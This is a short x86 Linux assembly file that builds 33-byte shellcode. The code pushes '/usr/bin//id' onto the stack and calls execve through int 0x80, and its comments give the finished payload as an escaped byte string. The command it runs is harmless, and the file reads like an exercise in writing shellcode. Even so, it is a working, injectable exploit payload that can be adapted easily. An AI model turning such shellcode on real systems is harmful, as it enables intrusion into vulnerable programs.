;asm to run /usr/bin//id

SECTION .text
global _start

_start:
xor     edx, edx    ;store  NULL in edx, ecx, ebx, and eax
xor     ecx, ecx
xor     ebx, ebx
xor     eax, eax
push 	eax
push    0x64692f2f  ;push '//id' (actually pushing the reverse)
push    0x6e69622f  ;push '/bin' (...)
push    0x7273752f  ;push '/usr' (...)
mov     ebx, esp
push	eax
mov	ecx, esp
mov     al, 11     ;syscall number of execve is 11
int     0x80        ;system call, go!

;shellcode
;33 BYTES!
;"\x31\xd2\x31\xc9\x31\xdb\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80"
